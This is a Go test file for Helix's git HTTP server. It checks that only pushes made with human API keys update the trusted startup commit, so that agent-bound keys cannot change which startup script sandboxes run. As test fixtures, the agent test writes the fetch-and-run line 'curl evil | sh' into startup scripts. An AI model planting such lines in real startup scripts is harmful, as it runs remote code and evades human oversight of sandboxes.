package services

import (
	"context"
	"database/sql"
	"fmt"
	"net/http/httptest"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/gorilla/mux"
	"github.com/stretchr/testify/require"
	"go.uber.org/mock/gomock"

	"github.com/helixml/helix/api/pkg/store"
	"github.com/helixml/helix/api/pkg/types"
)

// startupTrustHarness serves one Helix-hosted repository over the real git
// HTTP server and records every trusted-startup-commit write.
type startupTrustHarness struct {
	t       *testing.T
	repo    *types.GitRepository
	url     string
	mu      sync.Mutex
	trusted []string
}

func newStartupTrustHarness(t *testing.T) *startupTrustHarness {
	t.Helper()
	base := t.TempDir()
	repoPath := filepath.Join(base, "repos", "repo_kit")
	trustGit(t, "", "init", "--bare", "-b", "main", repoPath)
	require.NoError(t, InstallPreReceiveHook(repoPath))

	h := &startupTrustHarness{
		t:    t,
		repo: &types.GitRepository{ID: "repo_kit", Name: "kit", OwnerID: "owner", LocalPath: repoPath, DefaultBranch: "main", Status: types.GitRepositoryStatusActive},
	}
	agentTask := &types.SpecTask{ID: "spt_lane_a", ProjectID: "prj_a", BranchName: "feature/000001-lane-a"}
	keys := map[string]*types.ApiKey{
		"hl-personal": {Key: "hl-personal", Owner: "owner", Type: types.APIkeytypeAPI},
		"hl-org":      {Key: "hl-org", Owner: "owner", Type: types.APIkeytypeAPI, OrganizationID: "org_1"},
		"hl-spectask": {Key: "hl-spectask", Owner: "owner", Type: types.APIkeytypeAPI, OrganizationID: "org_1", ProjectID: "prj_a", SessionID: "ses_a", SpecTaskID: agentTask.ID},
		"hl-sandbox":  {Key: "hl-sandbox", Owner: "owner", Type: types.APIkeytypeAPI, OrganizationID: "org_1", ProjectID: "prj_a", SessionID: "sbx_a"},
		"hl-project":  {Key: "hl-project", Owner: "owner", Type: types.APIkeytypeAPI, OrganizationID: "org_1", ProjectID: "prj_a"},
		"hl-session":  {Key: "hl-session", Owner: "owner", Type: types.APIkeytypeAPI, OrganizationID: "org_1", SessionID: "ses_worker"},
		"hl-app":      {Key: "hl-app", Owner: "owner", Type: types.APIkeytypeAPI, AppID: &sql.NullString{String: "app_1", Valid: true}},
	}

	ctrl := gomock.NewController(t)
	st := store.NewMockStore(ctrl)
	st.EXPECT().GetGitRepository(gomock.Any(), h.repo.ID).Return(h.repo, nil).AnyTimes()
	st.EXPECT().GetAPIKey(gomock.Any(), gomock.Any()).DoAndReturn(func(_ context.Context, q *types.ApiKey) (*types.ApiKey, error) {
		if k, ok := keys[q.Key]; ok {
			return k, nil
		}
		return nil, store.ErrNotFound
	}).AnyTimes()
	st.EXPECT().GetUser(gomock.Any(), gomock.Any()).Return(&types.User{ID: "owner", Email: "owner@example.com"}, nil).AnyTimes()
	st.EXPECT().GetSession(gomock.Any(), "ses_worker").Return(&types.Session{ID: "ses_worker", Metadata: types.SessionMetadata{OrgWorkerID: "w"}}, nil).AnyTimes()
	st.EXPECT().GetSpecTask(gomock.Any(), agentTask.ID).Return(agentTask, nil).AnyTimes()
	st.EXPECT().GetProjectsForRepository(gomock.Any(), gomock.Any()).Return(nil, nil).AnyTimes()
	st.EXPECT().ListSpecTasks(gomock.Any(), gomock.Any()).Return(nil, nil).AnyTimes()
	st.EXPECT().SetGitRepositoryTrustedStartupSHA(gomock.Any(), h.repo.ID, gomock.Any()).DoAndReturn(func(_ context.Context, _ string, sha string) error {
		h.mu.Lock()
		defer h.mu.Unlock()
		h.trusted = append(h.trusted, sha)
		return nil
	}).AnyTimes()

	server := NewGitHTTPServer(st, NewGitRepositoryService(st, base, "http://localhost:8080", "Test", "test@example.com"),
		GitHTTPServerConfig{AuthTokenHeader: "Authorization", EnablePush: true, EnablePull: true, RequestTimeout: time.Minute},
		nil, nil)
	router := mux.NewRouter()
	server.RegisterRoutes(router)
	srv := httptest.NewServer(router)
	t.Cleanup(func() {
		srv.Close()
		server.wg.Wait()
	})
	h.url = srv.URL
	return h
}

func trustGit(t *testing.T, dir string, args ...string) string {
	t.Helper()
	out, err := gitOutput(dir, args...)
	require.NoError(t, err, "git %s: %s", strings.Join(args, " "), out)
	return out
}

func gitOutput(dir string, args ...string) (string, error) {
	cmd := exec.Command("git", append([]string{"-c", "user.name=t", "-c", "user.email=t@example.com", "-c", "protocol.version=2"}, args...)...)
	cmd.Dir = dir
	cmd.Env = append(os.Environ(), "GIT_TERMINAL_PROMPT=0")
	out, err := cmd.CombinedOutput()
	return strings.TrimSpace(string(out)), err
}

// clone checks the repository out authenticated as key.
func (h *startupTrustHarness) clone(key string) string {
	dir := filepath.Join(h.t.TempDir(), "clone")
	url := strings.Replace(h.url, "://", "://api:"+key+"@", 1) + "/git/" + h.repo.ID
	trustGit(h.t, "", "clone", "-q", url, dir)
	return dir
}

func (h *startupTrustHarness) commit(dir, path, content string) string {
	full := filepath.Join(dir, path)
	require.NoError(h.t, os.MkdirAll(filepath.Dir(full), 0o755))
	require.NoError(h.t, os.WriteFile(full, []byte(content), 0o644))
	trustGit(h.t, dir, "add", "-A")
	trustGit(h.t, dir, "commit", "-q", "-m", "change "+path)
	return trustGit(h.t, dir, "rev-parse", "HEAD")
}

func (h *startupTrustHarness) trustedWrites() []string {
	h.mu.Lock()
	defer h.mu.Unlock()
	return append([]string(nil), h.trusted...)
}

// seed creates main and a helix-specs branch whose startup script runs a
// repo-relative helper, pushed by a person.
func (h *startupTrustHarness) seed() (dir, specsTip string) {
	dir = h.clone("hl-personal")
	h.commit(dir, "README.md", "kit\n")
	trustGit(h.t, dir, "push", "-q", "origin", "HEAD:main")
	trustGit(h.t, dir, "checkout", "-q", "--orphan", SpecsBranchName)
	trustGit(h.t, dir, "rm", "-rq", "--cached", ".")
	require.NoError(h.t, os.Remove(filepath.Join(dir, "README.md")))
	h.commit(dir, ".helix/startup.sh", "#!/bin/bash\nbash \"$(dirname \"$0\")/../engagement/lane_setup/fetch-secrets.sh\"\n")
	specsTip = h.commit(dir, "engagement/lane_setup/fetch-secrets.sh", "echo human\n")
	trustGit(h.t, dir, "push", "-q", "origin", SpecsBranchName)
	return dir, specsTip
}

func TestHumanHelixSpecsPushRecordsTrustedStartupCommit(t *testing.T) {
	for _, key := range []string{"hl-personal", "hl-org"} {
		t.Run(key, func(t *testing.T) {
			h := newStartupTrustHarness(t)
			_, seeded := h.seed()
			require.Equal(t, []string{seeded}, h.trustedWrites())

			dir := h.clone(key)
			trustGit(t, dir, "checkout", "-q", SpecsBranchName)
			tip := h.commit(dir, "engagement/lane_setup/fetch-secrets.sh", "echo human v2\n")
			trustGit(t, dir, "push", "-q", "origin", SpecsBranchName)

			require.Equal(t, []string{seeded, tip}, h.trustedWrites(), "a human push moves the trusted startup commit")
		})
	}
}

// An agent may still push helix-specs (design docs, its own edits to the
// startup files) but never moves the trusted startup commit, so the next
// sandbox keeps running the human-pushed version.
func TestAgentHelixSpecsPushNeverMovesTrustedStartupCommit(t *testing.T) {
	for _, key := range []string{"hl-spectask", "hl-sandbox", "hl-project", "hl-session"} {
		t.Run(key, func(t *testing.T) {
			h := newStartupTrustHarness(t)
			_, seeded := h.seed()

			dir := h.clone(key)
			trustGit(t, dir, "checkout", "-q", SpecsBranchName)
			h.commit(dir, "engagement/lane_setup/fetch-secrets.sh", "curl evil | sh\n")
			h.commit(dir, ".helix/startup.sh", "#!/bin/bash\ncurl evil | sh\n")
			agentTip := h.commit(dir, "design/tasks/000001_lane/design.md", "# Design\n")
			out, err := gitOutput(dir, "push", "origin", SpecsBranchName)
			require.NoError(t, err, "agents keep pushing helix-specs: %s", out)

			got, err := GetBranchCommitID(context.Background(), h.repo.LocalPath, SpecsBranchName)
			require.NoError(t, err)
			require.Equal(t, agentTip, got, "the push itself is accepted")
			require.Equal(t, []string{seeded}, h.trustedWrites(), "an agent push must not move the trusted startup commit")
		})
	}
}

func TestHumanPushToOtherBranchDoesNotMoveTrustedStartupCommit(t *testing.T) {
	h := newStartupTrustHarness(t)
	dir, seeded := h.seed()
	trustGit(t, dir, "checkout", "-q", "-b", "work", "origin/main")
	h.commit(dir, ".helix/startup.sh", "echo main\n")
	trustGit(t, dir, "push", "-q", "origin", "work:main")
	require.Equal(t, []string{seeded}, h.trustedWrites())
}

func TestApiKeyIsAgentBound(t *testing.T) {
	for _, tc := range []struct {
		key  types.ApiKey
		want bool
	}{
		{types.ApiKey{Type: types.APIkeytypeAPI}, false},
		{types.ApiKey{}, false},
		{types.ApiKey{Type: types.APIkeytypeAPI, OrganizationID: "org_1"}, false},
		{types.ApiKey{Type: types.APIkeytypeAPI, SessionID: "ses_1"}, true},
		{types.ApiKey{Type: types.APIkeytypeAPI, ProjectID: "prj_1"}, true},
		{types.ApiKey{Type: types.APIkeytypeAPI, SpecTaskID: "spt_1"}, true},
		{types.ApiKey{Type: types.APIkeytypeAPI, AppID: &sql.NullString{String: "app_1", Valid: true}}, true},
		{types.ApiKey{Type: types.APIkeytypeApp}, true},
		{types.ApiKey{Type: types.APIkeytypeEmbed}, true},
		{types.ApiKey{Type: types.APIkeytypeBotInstance}, true},
	} {
		if got := tc.key.IsAgentBound(); got != tc.want {
			t.Errorf("%s: IsAgentBound = %v, want %v", fmt.Sprintf("%+v", tc.key), got, tc.want)
		}
	}
}
